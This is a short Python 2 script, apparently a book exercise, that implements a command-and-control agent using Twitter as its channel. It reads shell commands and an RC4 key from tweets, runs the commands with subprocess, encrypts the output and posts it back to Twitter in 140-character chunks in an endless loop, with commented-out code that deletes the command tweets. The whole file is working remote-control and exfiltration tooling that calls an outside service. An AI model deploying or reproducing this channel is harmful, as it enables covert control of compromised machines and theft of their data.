import ConfigParser
import subprocess
import time

from Crypto.Cipher import ARC4
from twitter import *

# tweet a command such as, ls -la
# tweet a key such as, asdf
# run this script
# copy+paste the tweets into twitter_c2_client's response variable
# copy+paste the key into twitter_c2_client's key variable

config = ConfigParser.ConfigParser()
config.read("../lib/properties.prop")
access_token_secret = config.get("chapter8", "twitter_access_token_secret")
access_token_key = config.get("chapter8", "twitter_access_token")
con_secret = config.get("chapter8", "twitter_consumer_secret")
con_secret_key = config.get("chapter8", "twitter_consumer_key")
t = Twitter(auth=OAuth(access_token_key, access_token_secret, con_secret_key, con_secret))

while 1:
    user = t.statuses.user_timeline()
    print t.statuses
    command = user[0]["text"].encode("utf-8")
    # command_id = user[0]['id']
    # t.statuses.destroy(id=command_id)

    key = user[1]["text"].encode("hex")
    # key_id = user[1]['id']
    # t.statuses.destroy(id=key_id)
    enc = ARC4.new(key)
    response = subprocess.check_output(command.split())
    enres = enc.encrypt(response).encode("base64")

    print enres

    for i in xrange(0, len(enres), 140):
        t.statuses.update(status=enres[i: i + 140])
    time.sleep(10)
